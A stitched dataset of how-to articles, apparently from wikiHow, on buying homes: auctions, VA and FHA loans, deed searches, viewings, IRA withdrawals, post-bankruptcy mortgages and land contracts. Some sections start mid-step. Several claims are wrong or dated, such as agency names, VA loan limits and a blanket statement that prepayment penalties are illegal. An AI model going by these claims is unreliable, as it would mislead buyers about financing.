Make an offer on a house you want to buy.,
Negotiate the price.,
Plan for closing.,
Close on your house.",How to Buy a House in Atlanta," If you are interested in buying a house in Atlanta, work with a real estate agent who will protect your interests.


Ask for referrals from friends, neighbors and co-workers. Atlanta is full of people buying and selling homes, and someone you know should be able to make a recommendation.
Do an Internet search, or review advertisements in print and online. Many Atlanta realtors advertise. You can also check with the National Association of Realtors for a referral.;
, Talk to your local Atlanta bank branch or credit union about a home loan. While credit standards are tighter, lenders are still willing to give mortgage to qualified individuals.


Determine what you can afford. Your lender will help evaluate your income and debts to determine how much of a mortgage you can reasonably afford.
Apply for a mortgage. Fill out the necessary paperwork to obtain a mortgage. Include all the information required, and indicate what you have saved for a down payment.
Calculate your Atlanta property tax rate. In Georgia, your property tax rate will be based on your millage rate, which depends on the jurisdiction you live in, and the current city and county tax rates. Your lender and realtor can help you determine how much to budget for property taxes.

, Talk to your agent about what you want, such as whether you want a single family home, a condominium, city living or suburban, number of bedrooms, and other details.


Decide between new construction in Atlanta or an older home. Many new developments in and around Atlanta are available, and there are also older neighborhoods with homes for sale. Tell your agent what you prefer, or take a look at homes in both categories.
Choose a preferred Atlanta neighborhood. The city of Atlanta has 242 established neighborhoods, including traditional neighborhoods, downtown and midtown areas, suburban subdivisions and housing projects.

, Once you find a home, your real estate agent will help you make an offer on the property.


Submit a contract. Your agent will help you write up a contract, including the purchase price you are offering, and any other stipulations you have, such as closing time frames and the understanding that purchase is contingent upon a successful inspection.
Provide a deposit, or earnest money. You place a deposit, also called earnest money, in trust with your real estate agent when you make an offer to demonstrate to the seller that you are serious. This deposit is usually around 1 percent of the price of the house.

, Either the seller will accept your offer or come back with a counter offer.


Listen to the recommendations of your real estate agent as you go back and forth with the seller on price.

, Once a price is agreed upon by both the buyer and the seller, you will set a closing date.


Schedule an inspection. Hire an inspector to look at the inside and outside of the house. Any issues found will need to be resolved by the seller before closing. Sometimes, the seller will offer you a credit on the final price rather than make the repairs that are needed.
Do a final walk-through. Right before you close on your house, do a final check with your real estate agent to make sure the house is ready for you to move in.
Prepare paperwork and closing costs. In Atlanta, the closing attorney present will represent your lender. He or she will manage the paperwork, transfer the title and collect and distribute payments.

, All you need to do is sign the paperwork, make the down payment and pay for the closing costs charged by your lender. The seller will turn over the keys, and you now have a new Atlanta home.

Contact a lawyer that specializes in real estate transactions for advice and assistance if you are considering buying a house at auction.,
Locate property auctions in the area you want to buy in.,
Attend several local house auctions in the area where you want to buy, whether you are interested in the particular property or not, so you can watch and get a feel for the auction process.,
Get pre-qualified for a mortgage from a bank or mortgage lender so you know how much buying power you have.

,
Do a full title search done on a property if you spot a house coming to auction that you think you would like to bid on.,
Visit or phone the town hall that governs the property you want to buy.,
Decide what your maximum bid price is and stick to it.",How to Buy a House at Auction,"


Purchasing a house at auction is risky. You should not attempt it without an attorney's help unless you have experience purchasing property at auction.
If the sale is a foreclosure auction run by the lender, the property is often still in foreclosure. In addition to the cost of the home, you may need to settle unpaid tax bills if you win. An attorney can help you find out all terms and outstanding debt attached to the property before the auction.
Property liens and outstanding taxes may also exist on houses auctioned by owners or as part of an estate settlement. The auctioneer or property owner is legally responsible for disclosing this information to all interested parties prior to accepting bids.;
,


Check with local realty offices to find out if they have listings for area houses up for auction. Lenders sometimes use real estate brokers to oversee the auctioning of the home, but not all real estate agents specialize in property auctions.
Watch your local newspaper's classified sections under both the ""Real Estate"" and the ""Auction"" listings.
Contact auctioneers in your area who specialize in real estate auctions, or call auctioneers' offices to find out if they hold house auctions.
Pay attention when driving for signs in front properties, especially if a house you want to buy is sitting empty. If the house is coming to auction, there should be a sign out front announcing the date of the auction and listing a phone number where you can call for more information.

,


Read the terms and conditions of the auction. Notice what fees the auctioneer charges and any money the winning bidder must pay in addition to the winning bid price.
Pay attention to the auctioneer's selling practice and how he calls for bids. Watch the crowd carefully to spot who is bidding and notice how they bid. Some auctioneers give out auction paddles or bid cards for bidders to use. After a bidder enters into the bidding, she sometimes indicates her continued bidding to the auctioneer with a head nod or hand movement.

,,


A title search will locate outstanding debts, including unpaid taxes and property liens, as well as previous construction debts that can reveal unknown condition issues.
Most reputable auctioneers provide a current title assessment that indicates that the property is free of all debt. Or, they will disclose the amount of outstanding debt that the new owner must assume, in addition to the house's bid price.
You can have an attorney do a title search for you if the auctioneer does not provide one, or you question the credibility of the auction company.

, Inquire about town by-laws, ordinances, zoning issues and toxic or hazardous waste issues that may affect your purchase decisions.

, Do not allow yourself to get caught up in the bidding and go over the price you decided you are willing to pay.

If you are in the National Reserve, you will need to have served for at least six years to qualify for this.

, In order to apply for a VA-backed loan you must provide proof that you are eligible for the program. Depending on your service and whether you are currently in the military, you must provide the following proof:


Military veterans and current or former National Guard or Reserve members who have been activated for federal active service must provide DD Form 214, which shows the character of service and the reason you left the military.
Active Duty Service members and current National Guard or Reserve members who have never been activated for Federal active service must provide a current statement of service that is signed by the adjutant, personnel office, or commander of the unit or higher headquarters.

Box 100034, Decatur, GA 30031., Since the VA does not lend money itself, you need to locate a lender that works with VA loans. Once the lender confirms that they work with VA loans, consider the following in evaluating the lender:


Get offers from several lenders and see who is offering you the best interest rates.
Show the lenders their competitors’ offers to see whether they will match or beat the best offer you received.
Check whether the lender is offering you a mortgage rate that is competitive to mortgage rates that people of similar credit ratings are receiving. You can see a breakdown of mortgage rates by credit score here. If you don't know what your credit score is, you can use free services such as Credit Karma to check it.
Ask all of the lenders to explain all of the closing costs, fees and any other expenses associated with the loan so you can understand and compare the true costs of each loan., By choosing to get prequalified for your VA loan, you can determine whether you will qualify for a loan and the amount you will qualify. Once preapproved, you can begin looking at properties and begin the home purchasing process. Generally, to become preapproved for a VA loan, lenders will examine your income, debt, expenses and other factors to determine whether they believe you will be able to repay a loan and the amount of the loan you can afford to repay.

, and all recurring monthly revolving and installment debt (car loans, personal loans, student loans, credit cards, etc.). Then, take that amount and divide it by the gross monthly income.
The maximum ratio to qualify is 41%.
In the event the number exceeds the 41%, the VA has a residual income guideline which can allow approval, yet are not considered a compensating factor., Your lender will provide you with all of the paperwork that you need to apply for the home loan as well as a checklist of any documents or information that you must provide with the application. If you went through the preapproval process, you may have already submitted some of the required documentation but there will be a much closer examination of your finances before a loan is finally approved.


You will need your DD214: Proof of Military Service form, and a prospective property.
Remember: all veterans who meet the criteria are eligible for the loan, but that does not mean that you will necessarily qualify for the loan that you seek.
The VA guarantees a loan of 25% of an amount up to $104,250, generally the list price of the home, plus the funding fee, which limits the maximum loan to $417,000.
Because there is no down payment involved, this will be a Guaranteed Loan, which means that the lender is protected against failure to pay."

Go to the records office during its open hours.,
Ask the clerks for help.,
Search the appropriate form of database.,
Look for a chain of title.,
Locate the recording number.,
Get copies of the deed from the clerk.,
Pay necessary fees.",How to Do a Deed Search2," These records are available to the public, but you cannot just go in and search anytime you want. Most public offices are open during regular business hours, and closed for government holidays. If they have a smaller staff, parts of the office may not be open all day.

, Most are very knowledgeable and eager to help. Be sure to supply them with as much information as possible. The more information you have, the more they will be able to assist you.

, Different offices will have different ways of storing their records. Some may even have a variety of different databases, depending on the time period you are searching in. The clerks should be able to direct you to the right database.


For older deeds, you will be directed to the grantor-grantee index books. These are typically large volumes. They may have gathered a great deal of dust through the passing decades. There are likely separate indexes for grantors (sellers) and grantees (buyers), so be prepared to search each separately.In some cases, the jurisdiction you are in will have put the older deeds on microfiche or microfilm. If they do, there will also be machines to read the film. If you don't know how to use the machine, ask the clerk for assistance.
If you are lucky, the jurisdiction will have scanned everything into computer files. Don’t count on it, though. Many locales only went back to a set year, say 1970, when computerizing their records.

, The purpose of a deed is to determine who has legal ownership of the property. Because the deed records the transfer of property from one owner to another, finding these names will allow you to trace the ownership of a property back through time.In searching through deeds, you may come across names of companies or large landowners that have many properties to their name. This is where other information you have, such as the address or APN, can be helpful in narrowing down a long list of potential dead ends.If a name isn’t recorded in the chain, it doesn’t exist, at least in terms of legal notice of a claim of interest. You may come across a ""wild"" deed, which records a transaction outside of the legal chain of title. Different states have different rules for the legal standing of wild deeds, so if you have a financial interest at stake in the property, you should discuss the issue with a property lawyer., Once you have found the deed, it should have a particular recording number, registering its entrance into the records. This is the number that the clerk will use to find the actual the deed itself.

, Once you have the recording number, the clerk should be able to pull the deed and either make copies, or let you make copies of the deed. Each office is different, so be sure to ask the clerk what to do.

, Most offices will charge for copies. The cost depends greatly on the size of the file you are looking at, how many copies you want, and the jurisdiction where you are researching. You don't want to be surprised when they ask you to pay!

Make sure that your house looks very good, not just nice.,
'De-smoke' the house.,
Leave any pets with a neighbour.,
Be careful what foods you cook on viewing days.,
Draw back your curtains/blinds to ensure the property is as light as possible.,
If you have a rear garden, cut the grass and keep it tidy.,
When viewers arrive, greet them and welcome them into your home.,
Plan an order in which you will show them the rooms.,
Make sure you know what companies provide your utilities.,
Some viewers may be tempted to make you an offer at the time of the viewing.",How to Conduct Your Own House Viewings," First impressions count and it is vital your home is in the best condition possible when potential buyers come to view your home.  Sweep the driveway and make sure the front of your house is tidy and inviting. If you have a parking space, move your car somewhere else and keep it available for viewers to use when they are visiting. You don’t want to give potential buyers an instant negative impression whilst trying to find somewhere to park their car.;
, From the moment you decide to sell, you should refrain from smoking indoors. Smoke infiltrates furniture and carpets and leaves a nasty smell. You might not smell it, but a non-smoking viewer will be put off. Definitely do not smoke inside on the day of a viewing!

, Viewers may be allergic to the hair or scared of dogs, plus the smell of animals can put off some viewers. Make sure you clean up any hair and hide the food bowls and bedding.

, Freshly baked bread can provide a nice homely smell. However, a strong curry smell can be off putting for some viewers.

, Sunlight will immediately brighten the property and create the illusion of space. In darker rooms ensure you keep the lights on. If you have under cupboard lights in the kitchen put them on to make your kitchen appear brighter.

, A nicely maintained garden could be the icebreaker in securing that all important offer.

, Always be polite and courteous.

, Show them around the property, but do not overload them with details. Do not point out any negatives but do mention the occasional positive. If someone is interested then they will ask you questions. Once you have shown them around invite them to take another look alone.  Stay on hand to answer any further questions.

, Viewers may ask what how much your energy bills cost or if the property is ready for cable television.

, If you are not comfortable with negotiating face to face, then inform them that you will contact them later, as you have other viewings already booked and do not want to make any promises.

Evaluate whether two mortgages is the best option for you.,
Use caution.,
Locate a lender or lenders willing to make an 80-20 loan.",How to Buy a Home With No Money Down3," An 80-20 mortgage is essentially two separate home loans, one for 80% of the home’s price and the other which covers the remaining 20% of the home’s price. Individuals choose an 80-20 mortgage to avoid a large down payment and monthly private mortgage insurance. When evaluating whether you would qualify for an 80-20 mortgage, consider the following:


Lenders typically look for individuals with a very high credit rating when offering two mortgages. The lender wants to be certain that the person can afford to make both payments.
Lenders may offer you a fixed rate on the 80% loan. However, lenders may only offer you a variable rate on the 20% loan, which means if interest rates go up, you may have to pay more than you originally planned.
Lenders may restrict the amount of the second loan because there is an increased risk in offering two loans to one home purchaser.
If you do qualify, you will have two payments, but talk to your financial advisor about consolidating them into a monthly lump sum. , You should be fully aware that taking out two loans to finance the purchase of a house can be a very risky venture.


Before the mortgage crisis of 2008, these loans were easy to come by and were possible to profit from. It was, however, one of the main causes of the mortgage crisis in 2008, making it an extremely difficult option to pursue now.
The problem with these types of loans is that, if the home loses value, you can end up owing more than the value of the home, meaning that you will lose money if you want to sell your house.
Likewise, an 80-20 loan will involve a much higher interest rate and higher monthly payments, which can make it difficult to make ends meet if you have trouble coming up with the monthly payments., You need to locate a lender willing to make an 80-20 loan. When discussing the potential loans, ask the lender to calculate:


Whether two loans with a blended interest rate saves you money as compared to a single loan that requires insurance.
Whether there is an early repayment penalty for the smaller loan. You may be able to save money over the life of the loan if you repay the smaller loan back more quickly since it will most likely have a higher interest rate.Discuss your plans with a financial advisor. Make sure that you will be able to repay both loans and that it makes financial sense to get two loans versus one loan with insurance.

Determine if you qualify as a first-time homebuyer.,
See if your spouse qualifies as a first-time homebuyer.,
Prepare to pay taxes on your IRA withdrawal.,
Purchase or begin constructing your new home within 120 days of your Traditional IRA withdrawal.",How to Buy a Home With IRA Money1," First-time homebuyers can use $10,000 of their Traditional IRA funds towards the purchase of a new home, without incurring a 10% penalty for taking the money before the age of 59 ½. The IRS defines a first-time homebuyer as someone who has not owned a primary residence during the past two years. Even if you owned a home more than 2 years ago, you will still qualify as a first-time homebuyer.
Owning a cottage or recreational property does not impact your status as a first-time homebuyer.;
, If legally married and buying the property together, you and your spouse may each withdraw $10,000 from your Traditional IRAs without penalty. The $10,000 per-person limit is a lifetime limit, so you can't withdraw $5,000 twice in two different home situations.


You can also qualify for the $10,000 exemption if you're helping your spouse, child, grandchild or parent buy a home. , You will need to pay federal and state taxes on the money you take from your Traditional IRA, as it will be considered income by the Internal Revenue Service. This may significantly lessen the total amount available to purchase a house.


For example, if you are in the 25 percent tax bracket, your $10,000 withdrawal will translate into only $7,500. , Failing to meet this deadline means that you will have to pay a penalty to the IRS. Remember to retain a dated copy of the purchase or construction contract, and copies of the documents you sign.


The penalty paid to the IRS in this case is 10% on withdrawn money. In addition, the withdrawal is taxed at the same rate as your regular income.
In addition to a downpayment, your IRA money can be used for other acquisition costs, including building or repairs to the house, closing costs and financing fees. "

Beware of mortgage scams.",How to Buy a Home After Filing Bankruptcy," While there are actually six different types of bankruptcy cases, chances are you filed either under chapter 7 of the federal code or chapter 13.How you filed your case may affect your ability to buy a house after bankruptcy.


In a chapter 7 bankruptcy, the trustee directed your assets to be liquidated and distributed to your creditors in exchange for a complete discharge of all of your debts. This is the ""clean slate"" form of bankruptcy.If you filed under chapter 13, the court consolidated your debts and set up a payment plan. After regular payments for three to five years, the balance of your debts was discharged. The courts often refer to this as a ""wage-earner's plan.""Both types of bankruptcy can stay on your credit report for up to ten years. However, the credit reporting agencies will often remove successfully discharged chapter 13 bankruptcies as soon as seven years from the filing date.;
, This may seem fruitless, but you need to know where you are starting from. You are entitled to one free credit report every year at https://www.annualcreditreport.com. This is the only credit reporting service that is authorized by federal law.You can also periodically monitor your credit score at no charge at sites like Credit Karma or through your credit card companies.As you pay your bills and start to rebuild your credit, you can watch your score increase.
Be very wary of any site offering free credit scores and credit reports that requires you to enter a credit card number. You may find yourself being charged for monthly credit monitoring services of dubious value.

, Many financial professionals recommend saving 20 percent of the projected purchase price for a down payment.On a $100,000 house, that is $20,000. That is the best case scenario assuming a conventional mortgage. There are some other mortgage options, but you should start a regular savings plan, aiming to put money away every paycheck.


If you can qualify for a government regulated FHA loan, your down payment may be reduced as low as 3 percent. On a $100,000 house, this reduces the initial investment to $3,000.
Honorable discharged veterans may qualify for a VA mortgage loan. However, you will still need savings for closing costs and moving., Your mortgage is not your only expense. Since your house will be under a loan, you will have to pay homeowner's insurance and no one can avoid property taxes. In general, you should budget no more than 28 percent of your gross monthly income for housing expenses., After your bankruptcy is settled, the fastest way to see your credit score rise is to pay all your monthly bills on time and to cautiously and gradually take on debt in the form of credit cards, auto loans, or small bank loans.


Avoid ""credit-rebuilder"" credit cards with high hidden fees to set-up the account, monthly account maintenance fees, or annual fees. Shop around for no-fee credit card.To help your credit score increase faster, keep your credit card balances below 30 percent of your total available credit limit., Along with the Federal Housing Authority, the US government works in tandem with two quasi-government enterprises to help ensure availability of mortgages for low and moderate income Americans.The Federal National Home Loan Mortgage Corporation, commonly known as Fannie Mae, offers not only low down payments, but also lets you finance some or all of your closing costs in the loan.There are strict income guidelines and documentation that you will have to produce to qualify.Freddie Mac, the common name for the Federal Home Loan Mortgage Corporation,also has income guidelines and is more dependent on your credit score.The Federal Housing Authority, or FHA, is a government-guaranteed loan available to those who meet income guidelines that are less strict than Fannie Me and Freddie Mac. Down payments can be as low as 3.5 percent.Veterans Administration loans may be available to those who completed their enlistment with an honorable discharge., There are additional options available for homebuyers with poor credit outside of government loans. These include:


The Neighborhood Assistance Corporation of America (NACA) is a non-profit group that assists people with damaged credit obtain affordable mortgages with little or no down payment.A NACA mortgage is not dependent on your credit score, but involves an intense 2+ year financial counseling and savings plan that you must complete before NACA will approve your application.
Conventional loans are also an option after a bankruptcy. Contact your local bank or credit union to discuss mortgages that may be suitable for your income and credit profile.
You can also seek seller-financed homes. This type of agreement involves your directly paying the seller of home over time, rather than working through a bank. However, seller financing contracts must still be legal documents written by a real estate lawyer in order to protect the interests of both you and the seller.

, The FHA and VA have the shortest waiting periods to apply for a mortgage after a bankruptcy. In general, if the bankruptcy has been completed to the satisfaction of the court, your waiting period is two years from the final discharge of your bankruptcy. The lender may make exceptions for otherwise well-qualified borrowers who are working a chapter 13 bankruptcy and have made 12 months of on-time payments.Fannie Mae loans have a two to four-year waiting period from the discharge date depending on the circumstances of the bankruptcy.There is no automatic waiting period for a mortgage through NACA or a conventional mortgage. However, the NACA financial counseling and savings plan may take at least two years to complete. Conventional lenders will likely have their own requirements as well, but also have the flexibility to consider your overall circumstances and write mortgages at any time after your bankruptcy filing.
The waiting period is a good time to build up your savings and credit score.

, Sitting out the waiting period after the discharge or your bankruptcy and the slow process of rebuilding your credit can be frustrating. However, the phrase ""Your Bad Credit Doesn't Matter,"" is a warning sign to hang up the phone, throw away the junk mail, or delete the email. Be aware of the common signs that a mortgage may be a scam looking to prey on your desire to buy a house after your bankruptcy.


Mortgages that claim your income or credit doesn't matter. If a lender is willing to make a loan that will drive your mortgage payment plus insurance and taxes above 28 percent of your gross income, this is a company that is setting you up to fail.
Excessive loan processing costs and prepayment penalties. Your closing costs should not exceed 5 percent of the loan and prepayment penalties are illegal for owner-occupied homes.
Refusal to detail all costs, fees, and commissions associated with the loan.
If you suspect you have been approached by a mortgage scammer, report it to http://www.stopfraud.gov/report.html."

Decide if leasing with an option to buy is right for you.,
Find an owner who is willing to option her house.,
Know the risks.,
Negotiate a contract.",How to Buy a Home With No Money Down4," This is another way to potentially purchase a house with little or no money down. Also known as an option or ""rent to own,"" this is an opportunity for you to rent a home you eventually plan to purchase, with a percentage of the rent paid going toward a down payment on the property.The rent on an optioned house is going to be above market (because you are also paying toward the down payment), so it may not be worth it to enter this arrangement unless you have your heart set on that particular house., People who have struggled to sell their home and are motivated may be more open to this arrangement.Keep an eye out for a house that has been on the market for a long time.

, While this can be a great arrangement for some, it is not for everyone. Be aware that there are risks involved with renting to buy, namely that, should you choose not to purchase the home, you will not get back any of the option money back, losing whatever you paid toward the down payment. It does mean that, should you change your mind, you are under no obligation to buy the house at the end of the lease.Make sure you have the home inspected before signing the lease or, at the very least, before buying the house. An appraisal will ensure you are paying a fair price for the home and you'll also find out if the house needs any major repairs. If there is major work to be done, it might be best not to enter into such an agreement, since the repairs may cost you quite a bit.Make sure you have agreed who will be responsible if anything happens to the house while you are leasing., You will need a standard lease agreement, plus an option to purchase.Because the title to the house remains with the original owner until the house is actually purchased, you will need a lease agreement as you would with any tenant/landlord situation. In addition, the option to purchase will grant the tenant the option to purchase the house after a predetermined amount of time.This includes the option fee, which is either paid upfront or as the higher-than-market rent.Both parties should have a lawyer review the contracts and make sure the following is established:Length of the lease period
Rent amount
Percentage of rent going toward down payment and how it will be held (usually in escrow)
What will happen if the renter decides not to buy at the end of the lease period (usually the renter loses the option money)
Who will pay for repairs, utilities, etc. (usually the tenant)
Who will pay property taxes, insurance and homeowner fees
What happens if the home value rises or falls between the time you sign the agreement and the end of the lease

Understand the FHA foreclosure process.,
Research foreclosure homes available in your state.,
Decide how much work you want to put into your house.,
Have the home inspected.,
Calculate the cost of the necessary repairs.,
Apply for an FHA 203k home repair mortgage after inspection.",How to Buy a Home With No Money Down5," When a person stops paying their FHA-guaranteed mortgage, the FHA may start the foreclosure process, which means that since the buyer can no longer make payments, the FHA will sell the home to pay off the mortgage of the defaulting buyer.Individuals can sometimes purchase FHA foreclosures, for little to no-money down., The FHA as part of HUD provides a website where homeowners can search for HUD properties for sale. You can search for these properties here: http://hudhomestore.com/HudHome/Index.aspx.


Non-government websites also allow you to search for FHA foreclosures. You can locate these websites by conducting an internet search for “FHA foreclosure properties.”
If possible, you will want to determine the reason for the foreclosure. The fact that the home was foreclosed upon may mean there is something structurally wrong with the house that you will need to get fixed as soon as possible. It may also mean the home was owned by someone who got locked into a high-interest loan they could not afford and ended up defaulting. It will be your burden to determine this.

, Depending on the reason for foreclosure, these homes may be what you might call “fixer-uppers” or simply be move-in ready homes that someone could no longer afford. Before purchasing a foreclosed home, you should understand the terminology of foreclosure so that you better understand what type of property you may be purchasing.


Insured (IN) homes are homes that have been foreclosed upon, but meet the Minimum Property Standards (MPS). This means that they have been evaluated by a home inspector, who has “passed” the home.
Insured with Escrow (IE) homes require some measure of repair to meet the MPS. This means that the home may have some pressing structural, heating, or plumbing deficiencies that will need taken care of in the short term. The problems are not such that the house is uninhabitable, but significant enough to affect the value of the home.
Uninsured (UI) homes do not meet MPS. This means that the home requires structural, heating, or plumbing repair before it can be inhabited.
People who undertake the project of a foreclosed home are may be DIY-types who enjoy the challenging of fixing up a property acquired on the cheap. If you are not excited about the idea of gutting a house and installing a new septic system (or paying to have this done), this might not be the option for you.

, Before purchasing the home, you need to fully understand the condition of the home and the amount of work and money you will need to invest so that the home is livable. You should hire a home inspector who can evaluate the home, determine any significant structural problems and establish how much it will cost to repair.


While homes that need substantial work are technically not available for “no money down” mortgages, if the home meets a certain threshold for repairs, you may be able to qualify for an FHA rehabilitation loan.

,


If you have discovered significant structural problems, decide how you're going to fix the home up and how much it will cost.
If you plan to do the work yourself, determine how much the materials cost and how much you can reasonably expect for your labor.
If you plan to hire someone to perform the work, determine how much will it cost and how long it will take.

, This FHA program allows home buyers to finance up to $35,000 into their mortgage to repair, improve, or upgrade their home.


Contact an FHA-approved lender and discuss the application process. You can locate lenders at: http://www.hud.gov/ll/code/llslcrit.cfm

You should keep in mind that purchasing a foreclosed property that needs a lot of work may not be the best option, particularly if the sum for the repairs exceeds the purchase price of the home, essentially resulting in a “zero money down” payment after the fact.

Withdraw Roth IRA money to help pay for your new house.",How to Buy a Home With IRA Money2," If open for at least 5 years, you will avoid taxes on any earnings withdrawn. However, you can withdraw contributions at any time without paying taxes or penalties. Contributions are the funds you deposit into a Roth IRA, while earnings are the funds gained from investments or interest. , There is no restriction on how much of your contributions (funds deposited into to a Roth IRA) can be withdrawn without paying taxes or penalties. However, any earnings (funds gained through interest or investments) you withdraw are subject to a $10,000 limit, and will be penalized unless are a first-time home buyer (as defined above). You might want to withdraw Roth IRA contributions to avoid restrictions. But in some cases it is better to withdraw earnings under the first-time home buyer exemption. That way your contributions can continue to generate interest.
If you exceed the $10,000 limit on earnings withdrawals, you have to pay income tax on the amount over $10,000. However, you are not charged an additional 10% fee by the IRS., If you only withdraw from your contributions, there is no need to buy your home within 120 days. However, this time-restriction still applies if you draw on earnings.Remember that a Roth IRA is only available to people whose annual income is below a certain level ($116,000 for an individual in 2015). If you believe that your income will grow above this level over time, it may be wise to use your Roth IRA to buy a home sooner than later.

You should have a steady income and expect for that income to remain steady in the coming years. In addition, consider whether or not you are planning to stay in the area long-term. If you don't imagine yourself in the same city in five years, you should reconsider purchasing a home.Don't just buy a home because it would be cheaper than rent and interest rates are favorable at the moment. Wait until you know you are truly financially and personally ready.The U.S. Department of Housing and Urban Development (HUD) offers housing counselors that can help you plan for your first home purchase. Visit http://www.hud.gov/counseling to find a counselor near you.;
, Your credit score will have a strong bearing on your ability to qualify for a loan. Having excellent credit will also reduce the amount of interest you will pay on the loan. Make sure that your credit score is good or excellent (over 700 or 750, respectively) to get the best rates. If you are applying with a partner, spouse, or friend, you will both need high credit scores to get these benefits. One person's poor credit can drag the overall application score down significantly.Check your credit score for free at http://www.annualcreditreport.com. You can access this score once per year.

, In order to qualify for a home loan, you'll usually need a down payment of 20 percent of the value of the home. In many cases, you'll also need at least six months' worth of mortgage payments in the bank. Finally, you'll also need money to cover closing costs, insurance, and taxes. If you don't have this money yet, consider waiting and saving for a few more years.You may be able to purchase a home with little or nothing down. However, this will typically require an additional expense known as Private Mortgage Insurance (PMI), that will add a significant amount to your monthly expenses.Closing costs can be anywhere from 2 to 5 percent of the home's selling price. Be sure to factor these into your calculations., Start by searching online for a calculator that can tell you how much home you can afford. Input your income and other expenses to see what your budget is. Then, search for homes on real estate listing websites like Trulia and Realtor.com to get an idea of what type of home you can afford. If these results don't meet your expectations, consider waiting to purchase your desired home when you can afford it.Remember that even though may technically be able to afford a certain amount, that doesn't mean that you can comfortably afford it. Remember that there will be unexpected home expenses, maintenance, and potentially unexpected life expenses in the months to come.
The point is, don't go broke buying a house. If you can't afford a certain amount comfortably, lower your budget., There is a large variety of loans available to first-time home buyers. In addition to standard bank loans, there may also be loans backed by your state that offer lower-than-market interest rates. In addition, the Federal Housing Administration (FHA) offers loans with low down payments to low-income buyers. These loans are also ideal for those with lower credit scores, as approval is easier to obtain. Veterans may also be able to qualify for VA loans, some of which offer favorable terms like 0 percent down. Talk to your agent, mortgage broker, or lender about availability for these programs.


For example, the FHA offers first-time buyers the ability to buy a home with as little as 3.5 percent down.Visit http://www.fha.gov/ for more information.

, Visit lenders in your area to get quotes for mortgage loans. Make sure to ask for loans with your desired terms, both in amount and duration. Once you've found one at a favorable rate, get a lender letter of pre-approval stating that you are eligible for a home loan of a specific sum of money. Many real estate agents require this as a prerequisite before taking on a prospective client., Determine what qualities you want in a home. Think about your present and futures needs for bedrooms, bathrooms, and common spaces. Think about your needs if you have a home business, hobby, or entertain guests frequently. Consider location as well. If you have children, you will want to be in a very safe area that's close to your desired school district. Make a list of qualities of your ""dream home"" to bring to your realtor.The HUD provides a printable home ""wish list"" at http://portal.hud.gov/hudportal/documents/huddoc?id=wishlist-en.pdf. Fill it out to help guide your search.

, Locate a good agent through referrals or online reviews. Go to their office and meet in person. Advise the agent of your situation and present your lender letter. Let the agent know what your preferences are. Ask to see available properties on the Multiple Listing Service (MLS) while you are there. Get a print-out of all information and availability along with current photographs for each house.


Seek an agent who is honest and moves quickly for you. Otherwise your dream home might slip away., Take notes about your first impressions and assess each home according to how well it meets, or fails to meet, your requirements. Ignore things that you can change, like paint colors, decor, and carpet. Imagine the house as it will be, not as it currently is. You can renovate a kitchen, but adding another floor or another bedroom is much more difficult. When evaluating, remember your priorities. Don't settle on a bad location just because you like the layout of the house., Narrow your search down to about three homes that meet your needs most closely. Your realtor can then schedule second visits of these homes so that you can look for any details you may have missed on your first pass.

, Make sure to check out the neighborhood before settling on a home. Talk to the neighbors about the incidence of crime, any noise issues, and the neighborhood community. Visit the neighborhood at different times of day to get a better feel for it yourself. You'll recognize red flags when you see or hear them., Ask for advice from the agent on the right amount to offer. The classic advice is to come in lower than the asking price. However, particularly desirable homes or those in competitive markets may require an offer at or even above asking. Your realtor will likely have a better handle on where you should make an offer relative to the asking price, so defer to their judgment. However, don't stretch your budget beyond your means, even if your dream house is in high demand., Let the agent submit your offer-to-purchase as soon as possible. Good properties don't last on the market very long. You will usually have to fill out an offer sheet with the help of your agent. This offer is then submitted to the seller for review. They can either accept or return with a counter-offer. Counter-offers are more common, though they may only make minor changes to the offer terms. Make sure to stay in close contact with your realtor after submitting an offer so that you can quickly review any counter-offers., Closing, also called settlement or escrow, involves the cooperation of the buyer and seller, their realtors, lenders, and lawyers to finalize the sale. Generally, most of this process will be handled by your agent. However, there may be some issues that require your attention throughout the process. Talk with your agent to inquire about the closing schedule and your responsibilities during this time.Closing costs are assessed during this time and include a number of fees, ranging from a loan origination fee to a survey fee.
You can expect closing costs to total 2 to 5 percent of the total cost of the home. So, for example, a $200,000 home would have closing costs of between $4,000 and $10,000.
Closing fees are estimated on your loan estimate when you apply for a loan. However, these fees often change during the closing process., Your offer will stipulate a certain number of days or weeks before closing so that financing can be finalized and the house can be inspected. During this time, the house is checked for any major structural issues, termites, and to ensure that the property boundaries are correct. You should accompany the inspector and your agent during the structural inspection, both to learn more about the house and to ask about any imperfections you might see.


Make sure to spend the money to get a truly professional home inspection. Getting a cursory, budget inspection can cost you a lot more in the long run., There will be a meeting on the closing date in which you will required to sign final documents releasing payment to the seller and taking possession of the home. At this point, the home will be yours, and the deeds and other documents will be signed and transferred. You will then receive the keys to your new house., Ask your realtor during closing about homeowners insurance. This type of insurance reimburses you in the event that your home is damaged or destroyed. Your specific insurance needs will depend on your geographical location, the value of your home, and the situation surrounding your purchase of the home. For example, you may need flood insurance if you live in a particularly flood-prone area, as most homeowners insurance plans do not cover flooding.


You will need to get homeowners insurance when you close on the house."

This allows for flexibility in setting up an agreeable payment schedule and permits the sale of homes to individuals with bad credit. Typically full payment is expected quicker than would be the case with a traditional mortgage, but the period of repayment is usually at least five years. The buyer lives in the house while he or she is completing payment on the property. However, payments may be based on a 15 year or longer payment schedule, with a balloon payment at end. This often requires the buyer to renegotiate with seller or find other financing.


Land contracts can be known by several other names, which vary in part by region. Synonyms include: Trust Deeds, Contract for Deed, Deeds of Trust, Home Notes, or Privately Held Mortgages.;
, It is possible that you will not be able to pay for the house under the terms initially stipulated. In a sale conducted with a bank, the seller will obtain the full value of the property more or less immediately upon sale. The land contract, therefore, provides much less confidence about the security of repayment. However, if the buyer does not pay on schedule, the seller can terminate the deal, keeping the home and all payments.


There is the possibility that damage will be incurred to the property while the seller occupies it, but land contracts often make the buyer responsible for the upkeep of the home.

, These are much more serious than the risks of the seller. Once a land contract is signed the buyer will only be considered to have an “equitable title” not a full “legal title” to the house. If one misses payments they might lose title to the house and all of the money that they have paid for it.


While you will have flexibility in negotiating your payment schedule, you might still find the terms more difficult to meet than a traditional mortgage payment. The rate of repayment is much quicker and the interest rate higher. Most land contracts are also set up so that in the end you will need to pay a large lump sum payment, for which you might still need to take out a loan.

, The real estate agent will both find you a house and help you negotiate terms with a buyer. Because of that, it is important that the real estate agent realizes your situation and understands that you want to purchase a home through a land contract. You should disclose this fact at the beginning of your search.

